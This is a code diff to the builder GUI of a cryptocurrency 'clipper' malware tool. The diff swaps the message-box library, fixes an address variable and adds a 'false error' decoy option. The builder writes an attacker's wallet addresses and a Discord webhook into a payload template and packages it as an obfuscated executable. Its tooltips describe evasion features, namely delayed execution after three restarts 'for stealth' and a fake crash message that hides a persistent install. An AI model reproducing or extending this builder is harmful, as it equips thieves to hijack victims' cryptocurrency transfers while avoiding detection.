@@ -4,7 +4,7 @@ enjoy my spaghetti code
 written with love by me >> https://github.com/3022-2
 """ 
 
-from CTkMessagebox import CTkMessagebox
+import tkinter.messagebox as messagebox
 from PIL import Image
 
 import customtkinter
@@ -106,6 +106,7 @@ class toplevel:
 class resetconfig:
     def reset():
         root.destroy()
+        root.quit()
         buildgui.main()
 
 class build:
@@ -125,7 +126,7 @@ class build:
             shutil.rmtree("build")
             rm_file_path = str(new_file_name).replace(".pyw", ".spec")
             os.remove(rm_file_path)
-            CTkMessagebox(title="info", message=f"process completed after {final_time}s. .exe can be found in output/dist_non_obfuscated and .pyw for code analysis can be found in output/{new_file_name}")
+            messagebox.showinfo(title="info", message=f"process completed after {final_time}s. .exe can be found in output/dist_non_obfuscated and .pyw for code analysis can be found in output/{new_file_name}")
 
     def obfuscate(current_path, new_file_name):
         if icon_path == "":
@@ -148,7 +149,7 @@ class build:
             shutil.rmtree("dist")
             rm_file_path = str(new_file_name).replace(".pyw", ".spec")
             os.remove(rm_file_path)
-            CTkMessagebox(title="info", message=f"process completed after {final_time}s. .exe can be found in output/dist_obfuscated and .pyw for code analysis can be found in output/{new_file_name}")
+            messagebox.showinfo(title="info", message=f"process completed after {final_time}s. .exe can be found in output/dist_obfuscated and .pyw for code analysis can be found in output/{new_file_name}")
     
     def build_method(single_use, obfuscate, exe_file, methodtype):
         btc_addr = btc_addr1
@@ -214,17 +215,20 @@ class build:
             ping = True
         else:
             ping = False
-
         if incubate_checkbox.get() == "on":
             incubate = True
         else:
             incubate = False
+        if false_error_checkbox.get() == "on":
+            false_error = True
+        else:
+            false_error = False
 
         script_content = script_content.replace('btcaddr = "SET BTC ADDRESS HERE"', f"btcaddr = '{btc_addr}'")
         script_content = script_content.replace('ethaddr = "SET ETH ADDRESS HERE"', f"ethaddr = '{eth_addr}'")
         script_content = script_content.replace('ltcaddr = "SET LTC ADDRESS HERE"', f"ltcaddr = '{ltc_addr}'")
         script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
-        script_content = script_content.replace('bchaddr = "SET BCH ADDRESS HERE"', f"bchaddr = '{bch_addr1}'")
+        script_content = script_content.replace('bchaddr = "SET BCH ADDRESS HERE"', f"bchaddr = '{bch_addr}'")
         script_content = script_content.replace('soladdr = "SET SOL ADDRESS HERE"', f"soladdr = '{sol_addr}'")
         script_content = script_content.replace('dogeaddr = "SET DOGE ADDRESS HERE"', f"dogeaddr = '{doge_addr}'")
         script_content = script_content.replace('xrpaddr = "SET XRP ADDRESS HERE"', f"xrpaddr = '{xrp_addr}'")
@@ -234,6 +238,7 @@ class build:
         script_content = script_content.replace('webhook_url = ""', f'webhook_url = "{webhook_url1}"')
         script_content = script_content.replace('ping = False', f'ping = {ping}')
         script_content = script_content.replace('incubate = False', f'incubate = {incubate}')
+        script_content = script_content.replace('false_error = False', f'false_error = {false_error}')
 
         temp_ignore_lst = []
 
@@ -283,7 +288,7 @@ class build:
         else:
             if ".pyw" not in out_name.get().strip():
                 check_valid_btn.configure(text="build", command=lambda: build.check_type(), state="normal")
-                CTkMessagebox(title="error", message="file must end in .pyw (python windowless)", icon="cancel")
+                messagebox.showerror(title="error", message="file must end in .pyw (python windowless)")
             else:
                 new_file_name = out_name.get().strip().replace(" ", "")
                 with open(os.path.join("output", new_file_name), "w") as new_file:
@@ -339,12 +344,12 @@ class buildclipperconfig:
         ping = ping_discord_checkbox.get()
 
         if obfuscate == "on" and exe_file == "on":
-            CTkMessagebox(title="error", message="both normal .exe and obfuscate .exe cannot be on", icon="cancel")
+            messagebox.showerror(title="error", message="both normal .exe and obfuscate .exe cannot be on")
         elif obfuscate == "off" and exe_file == "off":
-            CTkMessagebox(title="error", message="please pick a filetype (.exe, .exe obfuscated)", icon="cancel")
+            messagebox.showerror(title="error", message="please pick a filetype (.exe, .exe obfuscated)")
         else:
             if type == "set clipper type":
-                CTkMessagebox(title="error", message="please pick a valid clipper type", icon="cancel")
+                messagebox.showerror(title="error", message="please pick a valid clipper type")
                 buildclipperconfig.class_called = 0
             else:
                 buildclipperconfig.class_called += 1
@@ -355,7 +360,7 @@ class buildgui:
                          ltc_addr, bch_addr, sol_addr, doge_addr,
                          xrp_addr, trx_addr, webhook_url):
         if buildclipperconfig.class_called == 0:
-            CTkMessagebox(title="error", message="please set a config", icon="cancel")
+            messagebox.showerror(title="error", message="please set a config")
 
         else:
             global btc_addr1, eth_addr1, xmr_addr1, ltc_addr1, bch_addr1, sol_addr1, doge_addr1, xrp_addr1, trx_addr1, webhook_url1
@@ -373,7 +378,7 @@ class buildgui:
             webhook_url1 = str(webhook_url.get()).strip()
 
             if btc_addr1 == "" and eth_addr1 == "" and xmr_addr1 == "" and ltc_addr1 == "" and bch_addr1 == "" and sol_addr1 == "" and doge_addr1 == "" and xrp_addr1 == "" and trx_addr1 == "" and webhook_url1 == "":
-                CTkMessagebox(title="info", message="please add at least one crypto address")
+                messagebox.showinfo(title="info", message="please add at least one crypto address")
             else:
                 try:
                     if btc_addr1 != "":
@@ -432,7 +437,7 @@ class buildgui:
                     check_valid_btn.configure(text="build", command=lambda: build.check_type())
 
                 except Exception as e:
-                    CTkMessagebox(title="error", message=e, icon="cancel")
+                    messagebox.showerror(title="error", message=e)
 
     def icon_add():
         global icon_path
@@ -518,12 +523,14 @@ class buildgui:
         exe_file_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
 
         """going to just use global here on"""
-        global incubate_checkbox 
+        global incubate_checkbox, false_error_checkbox
         incubate_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="incubate (3 restarts)", onvalue="on", offvalue="off")
         incubate_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
+        false_error_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="false error", onvalue="on", offvalue="off")
+        false_error_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
 
         add_icon_btn = customtkinter.CTkButton(master=option_frame, text="add custom icon", command=lambda: buildgui.icon_add())
-        add_icon_btn.pack(fill="x", padx=5, pady=5)
+        add_icon_btn.pack(fill="x", padx=5, pady=0)
 
         icon_temp_label = customtkinter.CTkLabel(master=option_frame, text="icon will appear here", wraplength=150)
         icon_temp_label.pack(pady=(0, 5))
@@ -546,7 +553,8 @@ class buildgui:
         CTkToolTip.CTkToolTip(widget=add_icon_btn, message="add icon: sets a custom icon to the .exe - defult is the normal .exe icon. if icons not showing press the fix icons button", wraplength=300)
         CTkToolTip.CTkToolTip(widget=exit, message="exit: exits program", wraplength=300)
         CTkToolTip.CTkToolTip(widget=check_valid_btn, message="check valid: checks validity of crypto addresses and discord webhook", wraplength=300)
-        CTkToolTip.CTkToolTip(widget=incubate_checkbox, message="incubate: if enabled the code will not run until the computer is restarted 3 times, increases stealth", wraplength=300)
+        CTkToolTip.CTkToolTip(widget=incubate_checkbox, message="incubate: if enabled the code will not run until the computer is restarted 3 times, increases stealth, IF INCUBATE IS ENABLED FALSE ERROR WILL NEVER COME UP", wraplength=300)
+        CTkToolTip.CTkToolTip(widget=false_error_checkbox, message="false error: if enabled the code will throw a false error to make it look like the code has crashed when it really is just a decoy (wont be installed in the peristant file). IF INCUBATE IS ENABLED FALSE ERROR WILL NEVER COME UP", wraplength=300)
         
     def main():
         global option_frame, main_frame, root
